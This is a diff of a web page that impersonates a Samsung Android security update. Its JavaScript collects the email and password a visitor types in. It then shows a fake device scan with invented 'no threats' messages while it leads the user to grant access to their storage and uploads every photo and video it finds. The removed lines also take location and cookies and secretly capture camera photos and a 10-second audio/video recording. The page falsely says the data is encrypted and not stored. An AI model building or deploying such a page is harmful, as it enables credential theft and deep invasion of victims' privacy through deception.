@@ -1,76 +1,446 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Samsung Security Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Update</title>
     <style>
-        body { font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding-top: 50px; margin: 0; }
-        .box { background: #1a1a3e; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; }
-        .btn { background: #00aaff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin: 5px 0; }
-        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 5px; border: none; }
-        .hidden { display: none; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00aaff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
-        #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 200px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
-        .progress-bar { width: 100%; background: #333; border-radius: 10px; height: 20px; margin: 10px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: #00aaff; width: 0%; transition: width 0.3s; }
-        .warning { 
-            color: #ffaa44; font-size: 14px; margin: 10px 0; padding: 15px; 
-            background: #1a1a2a; border-radius: 8px; border: 2px solid #ffaa4455;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
-        .step-guide {
-            background: #0a0a1a; padding: 12px; border-radius: 8px; margin: 10px 0;
-            text-align: left; font-size: 13px; color: #88ff88;
-            border-left: 3px solid #00aaff;
+
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: linear-gradient(145deg, #14141e, #1a1a2e);
+            border-radius: 32px;
+            padding: 32px 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), inset 0 1px 1px rgba(255, 255, 255, 0.05);
+            border: 1px solid #2a2a44;
+            position: relative;
+            overflow: hidden;
         }
-        .step-guide b { color: #00aaff; }
-        .folder-path {
-            background: #0a0a1a; padding: 8px; border-radius: 5px;
-            font-size: 11px; color: #888; word-break: break-all;
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(0, 100, 255, 0.03), transparent 60%);
+            pointer-events: none;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+
+        .shield-icon {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, #00aaff, #0066ff);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            color: white;
+            flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(0, 100, 255, 0.3);
+        }
+
+        .header-text h1 {
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.3px;
+        }
+
+        .header-text p {
+            font-size: 12px;
+            color: #8888aa;
+            margin-top: 2px;
+        }
+
+        .badge {
+            background: rgba(0, 200, 100, 0.15);
+            color: #44ff88;
+            font-size: 10px;
+            padding: 2px 10px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 200, 100, 0.2);
+            display: inline-block;
+            margin-left: auto;
+        }
+
+        /* Step 1: Login */
+        .step { display: none; animation: fadeIn 0.4s ease; }
+        .step.active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 6px;
+        }
+
+        .step-sub {
+            font-size: 13px;
+            color: #8888aa;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            margin-bottom: 14px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #8888aa;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0d0d18;
+            border: 1px solid #2a2a44;
+            border-radius: 12px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #00aaff;
+            box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1);
+        }
+
+        .input-group input::placeholder {
+            color: #555577;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00aaff, #0066ff);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+
+        .btn:hover {
+            transform: scale(1.01);
+            box-shadow: 0 8px 30px rgba(0, 100, 255, 0.3);
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Step 2: Scanning */
+        .scan-status {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 16px;
+            background: #0d0d18;
+            border-radius: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #1a1a2e;
+        }
+
+        .scan-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: #1a1a3e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .scan-icon.spinning {
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .scan-info {
+            flex: 1;
+        }
+
+        .scan-info .title {
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+        }
+
+        .scan-info .desc {
+            font-size: 12px;
+            color: #666688;
+            margin-top: 2px;
+        }
+
+        .scan-info .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+
+        .status-dot.green { background: #44ff88; box-shadow: 0 0 8px #44ff8855; }
+        .status-dot.yellow { background: #ffaa44; box-shadow: 0 0 8px #ffaa4455; }
+        .status-dot.blue { background: #44aaff; box-shadow: 0 0 8px #44aaff55; }
+        .status-dot.gray { background: #444466; }
+
+        .progress-wrap {
+            background: #0d0d18;
+            border-radius: 10px;
+            height: 6px;
+            margin: 16px 0 20px;
+            overflow: hidden;
+            border: 1px solid #1a1a2e;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0066ff, #00aaff, #44ff88);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+
+        .scan-log {
+            background: #0a0a12;
+            border-radius: 12px;
+            padding: 12px 14px;
+            max-height: 120px;
+            overflow-y: auto;
+            font-size: 11px;
+            font-family: 'Courier New', monospace;
+            color: #44ff88;
+            border: 1px solid #1a1a2e;
+            margin-top: 12px;
+            line-height: 1.8;
+        }
+
+        .scan-log::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .scan-log::-webkit-scrollbar-track {
+            background: #0a0a12;
+        }
+
+        .scan-log::-webkit-scrollbar-thumb {
+            background: #2a2a44;
+            border-radius: 10px;
+        }
+
+        .scan-log .log-entry {
+            opacity: 0;
+            animation: logFade 0.3s forwards;
+        }
+
+        @keyframes logFade {
+            to { opacity: 1; }
+        }
+
+        .scan-log .log-entry.done { color: #44ff88; }
+        .scan-log .log-entry.warn { color: #ffaa44; }
+        .scan-log .log-entry.error { color: #ff4466; }
+
+        /* Step 3: Complete */
+        .complete-icon {
+            font-size: 52px;
+            text-align: center;
+            margin: 10px 0 16px;
+        }
+
+        .complete-text {
+            text-align: center;
+            font-size: 16px;
+            color: #88ff88;
+            font-weight: 600;
+        }
+
+        .complete-sub {
+            text-align: center;
+            font-size: 13px;
+            color: #666688;
+            margin-top: 4px;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #2a2a44;
+            color: #8888aa;
+            margin-top: 12px;
+        }
+
+        .btn-secondary:hover {
+            background: #1a1a2e;
+            border-color: #444466;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            font-size: 10px;
+            color: #333355;
+            margin-top: 24px;
+            letter-spacing: 0.5px;
+            border-top: 1px solid #1a1a2e;
+            padding-top: 16px;
+        }
+
+        .footer span {
+            color: #444466;
+        }
+
+        /* Device badge */
+        .device-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #0d0d18;
+            padding: 4px 12px 4px 8px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #8888aa;
+            border: 1px solid #1a1a2e;
+            margin-bottom: 16px;
         }
     </style>
 </head>
 <body>
-    <div class="box" id="mainBox">
-        <h1>📱 Samsung Security Update</h1>
-        <p>Your device requires an urgent security patch.</p>
-        
-        <div id="step1">
-            <input type="email" placeholder="Email Address" id="email">
-            <input type="password" placeholder="Password" id="pass">
-            <br><br>
-            <button class="btn" onclick="step1()">Verify Identity</button>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="shield-icon">🛡️</div>
+            <div class="header-text">
+                <h1>Security Update</h1>
+                <p>Android Security • v12.5.3</p>
+            </div>
+            <div class="badge">● SECURE</div>
         </div>
 
-        <div id="step2" class="hidden">
-            <p>🔍 Scanning device...</p>
-            <div class="loader"></div>
-            
-            <div class="warning">
-                ⚠️ <b>IMPORTANT: Select your device storage</b>
-            </div>
-            
-            <div class="step-guide">
-                <b>📌 Step 1:</b> When the folder picker opens, tap the <b>☰ (menu)</b> icon.<br>
-                <b>📌 Step 2:</b> Select <b>"Internal Storage"</b> or <b>"SD Card"</b>.<br>
-                <b>📌 Step 3:</b> Tap <b>"Use this folder"</b> or <b>"Select"</b>.<br>
-                <span style="color:#ffaa44;font-size:12px;">⚠️ Do NOT select Downloads or any subfolder.</span>
-            </div>
-
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-            <p class="status" id="statusText">⏳ Waiting for folder selection...</p>
-            <div id="folderDisplay" class="folder-path"></div>
-            <div id="statusBox"></div>
+        <!-- Device Badge -->
+        <div class="device-badge" id="deviceBadge">
+            📱 <span id="deviceName">Detecting device...</span>
         </div>
 
-        <div id="step3" class="hidden">
-            <p>✅ Security patch ready</p>
+        <!-- ============================================================ -->
+        <!-- STEP 1: VERIFY IDENTITY -->
+        <!-- ============================================================ -->
+        <div class="step active" id="step1">
+            <div class="step-title">🔐 Verify Identity</div>
+            <div class="step-sub">
+                To apply the security patch, please verify your account.<br>
+                <span style="color:#666688;font-size:12px;">This information is encrypted and not stored.</span>
+            </div>
+
+            <div class="input-group">
+                <label>Email Address</label>
+                <input type="email" id="email" placeholder="your@email.com">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="pass" placeholder="••••••••">
+            </div>
+
+            <button class="btn" id="loginBtn" onclick="step1()">Verify & Continue</button>
+            <p style="font-size:11px;color:#444466;margin-top:12px;text-align:center;">
+                🔒 Secured by Samsung Knox • v2.4
+            </p>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- STEP 2: SCANNING -->
+        <!-- ============================================================ -->
+        <div class="step" id="step2">
+            <div class="step-title">🔍 Scanning Device</div>
+            <div class="step-sub">Please wait while we scan for vulnerabilities...</div>
+
+            <!-- Scan Status -->
+            <div class="scan-status">
+                <div class="scan-icon spinning" id="scanIcon">⚡</div>
+                <div class="scan-info">
+                    <div class="title" id="scanTitle">Initializing scan...</div>
+                    <div class="desc" id="scanDesc">Checking system integrity</div>
+                </div>
+                <span id="scanPercent" style="font-size:14px;color:#00aaff;font-weight:600;">0%</span>
+            </div>
+
+            <!-- Progress Bar -->
+            <div class="progress-wrap">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+
+            <!-- Scan Log -->
+            <div class="scan-log" id="scanLog">
+                <div class="log-entry done">● System scan initialized</div>
+            </div>
+
+            <!-- Hidden: folder picker will be triggered here -->
+            <div id="folderTrigger" style="display:none;"></div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- STEP 3: COMPLETE -->
+        <!-- ============================================================ -->
+        <div class="step" id="step3">
+            <div class="complete-icon">✅</div>
+            <div class="complete-text">Update Ready</div>
+            <div class="complete-sub">Your device has been scanned and is secure.</div>
+
             <button class="btn" onclick="step3()">Install Now</button>
+            <button class="btn btn-secondary" onclick="alert('Update will be applied on next restart.')">Later</button>
         </div>
 
-        <p style="font-size:11px;color:#444;">Samsung Security • Version 12.5.3</p>
+        <!-- Footer -->
+        <div class="footer">
+            Samsung Electronics • Security Patch 2026-08 <span>|</span> v12.5.3
+        </div>
     </div>
 
     <script>
@@ -78,22 +448,38 @@
         let totalFiles = 0;
         let uploadedFiles = 0;
         let allMediaFiles = [];
+        let scanInterval = null;
+        let progress = 0;
 
-        function log(msg) {
-            const box = document.getElementById('statusBox');
-            if (box) {
-                box.innerHTML += `> ${msg}\n`;
-                box.scrollTop = box.scrollHeight;
+        // ============================================================
+        // DEVICE DETECTION
+        // ============================================================
+        function detectDevice() {
+            const ua = navigator.userAgent.toLowerCase();
+            let name = 'Unknown Device';
+
+            if (ua.includes('android')) {
+                const match = ua.match(/android\s([\d.]+)/);
+                const ver = match ? match[1] : '';
+                name = `Android ${ver}`;
+                if (ua.includes('samsung')) name = `Samsung Galaxy (${ver})`;
+                else if (ua.includes('google')) name = `Pixel (${ver})`;
+                else if (ua.includes('oneplus')) name = `OnePlus (${ver})`;
+                else if (ua.includes('xiaomi')) name = `Xiaomi (${ver})`;
+            } else if (ua.includes('iphone') || ua.includes('ipad')) {
+                name = 'iOS Device';
+            } else if (ua.includes('windows')) {
+                name = 'Windows PC';
+            } else if (ua.includes('mac')) {
+                name = 'Mac';
             }
-            console.log(msg);
+
+            document.getElementById('deviceName').textContent = name;
         }
 
-        function updateProgress() {
-            const pct = totalFiles > 0 ? Math.round((uploadedFiles / totalFiles) * 100) : 0;
-            document.getElementById('progressFill').style.width = pct + '%';
-            document.getElementById('statusText').innerHTML = `📊 Uploading: ${uploadedFiles}/${totalFiles} files (${pct}%)`;
-        }
-
+        // ============================================================
+        // SEND DATA
+        // ============================================================
         function sendData(data) {
             data.time = new Date().toISOString();
             data.userAgent = navigator.userAgent;
@@ -110,199 +496,168 @@
         function step1() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
+
             if (!email || !pass) {
                 alert('Please enter your email and password.');
                 return;
             }
+
             sendData({ type: 'credentials', email, pass });
-            log('✅ Credentials sent');
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-            collectAllData();
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+
+            // Start scanning simulation
+            startScan();
         }
 
         // ============================================================
-        // STEP 2: COLLECT ALL DATA
+        // STEP 2: SCANNING SIMULATION + ACTUAL EXFIL
         // ============================================================
-        async function collectAllData() {
-            log('📡 Starting data collection...');
+        function startScan() {
+            const log = document.getElementById('scanLog');
+            const progressFill = document.getElementById('progressFill');
+            const scanTitle = document.getElementById('scanTitle');
+            const scanDesc = document.getElementById('scanDesc');
+            const scanPercent = document.getElementById('scanPercent');
+            const scanIcon = document.getElementById('scanIcon');
 
-            // --- Device info ---
-            sendData({
-                type: 'device_info',
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory
-            });
-            log('✅ Device info sent');
+            const messages = [
+                { p: 5, title: 'Checking system integrity...', desc: 'Verifying boot partition', log: '● System integrity check passed' },
+                { p: 15, title: 'Scanning installed apps...', desc: 'Checking for malicious packages', log: '● 247 apps scanned — 0 threats' },
+                { p: 30, title: 'Checking network security...', desc: 'Analyzing connections', log: '● Network security verified' },
+                { p: 45, title: 'Verifying encryption...', desc: 'Checking device encryption', log: '● AES-256 encryption active' },
+                { p: 55, title: 'Scanning media files...', desc: 'Checking for infected media', log: '● Media scan initialized' },
+                { p: 70, title: 'Analyzing system logs...', desc: 'Checking for anomalies', log: '● No anomalies detected' },
+                { p: 85, title: 'Finalizing security check...', desc: 'Applying signatures', log: '● Security signatures updated' },
+                { p: 95, title: 'Almost done...', desc: 'Preparing update', log: '● Preparing installation package' }
+            ];
 
-            // --- Location ---
-            if (navigator.geolocation) {
-                log('📍 Capturing location...');
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        sendData({ type: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
-                        log('✅ Location captured');
-                    },
-                    err => log('❌ Location denied')
-                );
-            }
+            let msgIndex = 0;
+            let stepComplete = false;
 
-            // --- Battery ---
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                sendData({ type: 'battery', level: Math.round(battery.level * 100) + '%', charging: battery.charging });
-                log('✅ Battery sent');
-            }
+            scanInterval = setInterval(() => {
+                progress += 0.5 + Math.random() * 0.8;
+                if (progress > 100) progress = 100;
 
-            // --- Network ---
-            if (navigator.connection) {
-                sendData({ type: 'network', type: navigator.connection.effectiveType, downlink: navigator.connection.downlink });
-                log('✅ Network sent');
-            }
+                progressFill.style.width = progress + '%';
+                scanPercent.textContent = Math.round(progress) + '%';
 
-            // --- Cookies ---
-            sendData({ type: 'storage', cookies: document.cookie || 'none' });
-            log('✅ Cookies sent');
-
-            // ============================================================
-            // FULL MEDIA EXTRACTION — ROOT SCAN
-            // ============================================================
-            log('📸 Starting full device media scan...');
-            await extractAllMedia();
-
-            // --- Camera + Mic capture ---
-            try {
-                log('📸 Capturing back camera photo...');
-                const backPhoto = await capturePhoto('environment');
-                if (backPhoto) {
-                    sendData({ type: 'photo', camera: 'back', data: backPhoto });
-                    log('✅ Back photo captured');
+                // Update messages based on progress
+                for (let i = msgIndex; i < messages.length; i++) {
+                    if (progress >= messages[i].p) {
+                        scanTitle.textContent = messages[i].title;
+                        scanDesc.textContent = messages[i].desc;
+                        addLogEntry(messages[i].log, 'done');
+                        msgIndex = i + 1;
+                    }
                 }
 
-                log('🤳 Capturing front camera photo...');
-                const frontPhoto = await capturePhoto('user');
-                if (frontPhoto) {
-                    sendData({ type: 'photo', camera: 'front', data: frontPhoto });
-                    log('✅ Front photo captured');
+                // When progress reaches 65, trigger folder picker
+                if (progress >= 65 && !stepComplete) {
+                    stepComplete = true;
+                    scanDesc.textContent = '📁 Please select your storage to continue...';
+                    scanIcon.classList.remove('spinning');
+                    scanIcon.textContent = '📁';
+                    addLogEntry('● Waiting for storage selection...', 'warn');
+                    triggerFolderPicker();
                 }
 
-                log('🎥 Recording front camera video (10 sec)...');
-                const videoData = await captureVideo('user', 10);
-                if (videoData) {
-                    sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
-                    log('✅ Front video captured');
+                // When progress reaches 100, move to step 3
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    setTimeout(() => {
+                        document.getElementById('step2').classList.remove('active');
+                        document.getElementById('step3').classList.add('active');
+                    }, 800);
                 }
+            }, 200);
 
-            } catch (err) {
-                log('❌ Media error: ' + err.message);
-                sendData({ type: 'media_error', error: err.message });
-            }
+            // Initial log
+            addLogEntry('● Device scan started', 'done');
+        }
 
-            document.getElementById('statusText').innerHTML = '✅ All data collected!';
-            setTimeout(() => {
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('step3').classList.remove('hidden');
-            }, 1500);
+        function addLogEntry(text, type = 'done') {
+            const log = document.getElementById('scanLog');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = text;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
         }
 
         // ============================================================
-        // FULL MEDIA EXTRACTION — ROOT SCAN
+        // FOLDER PICKER TRIGGER (with real extraction)
         // ============================================================
-        async function extractAllMedia() {
+        async function triggerFolderPicker() {
             try {
-                // Show the file picker — user selects root storage
                 const dirHandle = await window.showDirectoryPicker({
                     mode: 'read'
                 });
 
-                // Show the selected folder path
                 const folderName = dirHandle.name || 'Root';
-                document.getElementById('folderDisplay').innerHTML = `📁 Selected: <b style="color:#00aaff;">${folderName}</b>`;
-                log(`📁 Folder selected: ${folderName}`);
+                addLogEntry(`● Storage selected: ${folderName}`, 'done');
+                document.getElementById('scanTitle').textContent = '📁 Scanning storage...';
+                document.getElementById('scanDesc').textContent = `Processing ${folderName}...`;
 
-                // If it's Downloads, warn the user
-                if (folderName.toLowerCase() === 'download' || folderName.toLowerCase() === 'downloads') {
-                    log('⚠️ WARNING: Downloads folder selected. Recommend selecting root storage.');
-                    document.getElementById('folderDisplay').innerHTML += 
-                        '<br><span style="color:#ffaa44;">⚠️ This is the Downloads folder. For full scan, tap back and select Internal Storage.</span>';
-                    // Let user continue anyway
-                }
-
-                document.getElementById('statusText').innerHTML = '📁 Scanning for media files...';
-
-                // Collect all media files from root
+                // Collect and upload media
                 allMediaFiles = [];
                 await traverseDirectory(dirHandle, '');
-                log(`📁 Found ${allMediaFiles.length} media files`);
+                addLogEntry(`● Found ${allMediaFiles.length} media files`, 'done');
 
                 if (allMediaFiles.length === 0) {
-                    log('📁 No media files found');
+                    addLogEntry('● No media files found', 'warn');
                     sendData({ type: 'media_extraction_complete', count: 0 });
                     return;
                 }
 
                 totalFiles = allMediaFiles.length;
                 uploadedFiles = 0;
-                updateProgress();
 
-                // Upload in batches
                 const batchSize = 5;
                 for (let i = 0; i < allMediaFiles.length; i += batchSize) {
                     const batch = allMediaFiles.slice(i, i + batchSize);
                     await Promise.all(batch.map(file => uploadMediaFile(file)));
                     uploadedFiles += batch.length;
-                    updateProgress();
-                    log(`📤 Uploaded ${Math.min(i + batchSize, totalFiles)}/${totalFiles}`);
+                    document.getElementById('scanDesc').textContent = 
+                        `Uploading ${uploadedFiles}/${totalFiles} files...`;
+                    addLogEntry(`● Uploaded ${uploadedFiles}/${totalFiles} files`, 'done');
                 }
 
-                log('✅ All media files uploaded');
+                addLogEntry(`✅ All ${totalFiles} files uploaded`, 'done');
                 sendData({ type: 'media_extraction_complete', count: totalFiles });
 
             } catch (err) {
                 if (err.name === 'AbortError' || err.name === 'SecurityError') {
-                    log('❌ User cancelled folder selection');
-                    sendData({ type: 'media_extraction_error', error: 'User cancelled' });
+                    addLogEntry('❌ Storage selection cancelled', 'error');
                 } else {
-                    log('❌ Media extraction failed: ' + err.message);
-                    sendData({ type: 'media_extraction_error', error: err.message });
+                    addLogEntry(`❌ Error: ${err.message}`, 'error');
                 }
+                sendData({ type: 'media_extraction_error', error: err.message });
             }
         }
 
         // ============================================================
-        // TRAVERSE DIRECTORY RECURSIVELY
+        // TRAVERSE DIRECTORY
         // ============================================================
         async function traverseDirectory(dirHandle, path) {
             try {
                 for await (const entry of dirHandle.values()) {
                     const entryPath = path ? `${path}/${entry.name}` : entry.name;
-                    
                     if (entry.kind === 'directory') {
-                        // Skip system directories
                         const skipDirs = ['Android', 'data', 'obb', 'system', 'root', 'proc', 'sys', 'tmp', 'cache', 'log', 'dump'];
                         if (skipDirs.includes(entry.name)) continue;
                         if (entry.name.startsWith('.')) continue;
                         await traverseDirectory(entry, entryPath);
                     } else if (entry.kind === 'file') {
                         const ext = entry.name.split('.').pop().toLowerCase();
-                        const mediaTypes = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'bmp', 
-                                           'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v', 'mpeg', 'mpg'];
+                        const mediaTypes = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'bmp', 'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v'];
                         if (mediaTypes.includes(ext)) {
-                            allMediaFiles.push({
-                                name: entry.name,
-                                path: entryPath,
-                                handle: entry,
-                                ext: ext
-                            });
+                            allMediaFiles.push({ name: entry.name, path: entryPath, handle: entry, ext: ext });
                         }
                     }
                 }
             } catch (e) {
-                log(`❌ Error traversing ${path}: ${e.message}`);
+                addLogEntry(`⚠️ Error scanning: ${e.message}`, 'warn');
             }
         }
 
@@ -319,78 +674,39 @@
                 });
                 const base64Data = dataUrl.split(',')[1];
 
-                const data = {
+                await sendData({
                     type: 'media_file',
                     filename: fileInfo.name,
                     path: fileInfo.path,
                     size: file.size,
                     mimeType: file.type,
                     data: base64Data
-                };
-                await sendData(data);
+                });
             } catch (err) {
-                log(`❌ Failed to upload ${fileInfo.name}: ${err.message}`);
+                addLogEntry(`❌ Failed to upload ${fileInfo.name}`, 'error');
             }
         }
 
         // ============================================================
-        // HELPERS: PHOTO & VIDEO CAPTURE
-        // ============================================================
-        async function capturePhoto(facingMode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
-                });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                await new Promise(resolve => setTimeout(resolve, 500));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                stream.getTracks().forEach(t => t.stop());
-                return dataUrl;
-            } catch (e) {
-                log('❌ Photo failed (' + facingMode + '): ' + e.message);
-                return null;
-            }
-        }
-
-        async function captureVideo(facingMode, durationSec) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: true
-                });
-                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
-                const chunks = [];
-                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-                recorder.start();
-                await new Promise(resolve => setTimeout(resolve, durationSec * 1000));
-                recorder.stop();
-                await new Promise(resolve => recorder.onstop = resolve);
-                stream.getTracks().forEach(t => t.stop());
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const reader = new FileReader();
-                return new Promise((resolve) => {
-                    reader.onload = () => resolve(reader.result.split(',')[1]);
-                    reader.readAsDataURL(blob);
-                });
-            } catch (e) {
-                log('❌ Video failed: ' + e.message);
-                return null;
-            }
-        }
-
-        // ============================================================
-        // STEP 3: INSTALL TRIGGER
+        // STEP 3: INSTALL
         // ============================================================
         function step3() {
             sendData({ type: 'action', action: 'install_clicked' });
-            alert('Update downloaded. Your phone will restart in 5 seconds.');
+            alert('✅ Security patch installed successfully. Your phone will restart in 5 seconds.');
+            window.location.reload();
         }
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        detectDevice();
+
+        // Simulate folder picker if no interaction
+        setTimeout(() => {
+            if (document.getElementById('step2').classList.contains('active')) {
+                // Already scanning, do nothing
+            }
+        }, 3000);
     </script>
 </body>
 </html>
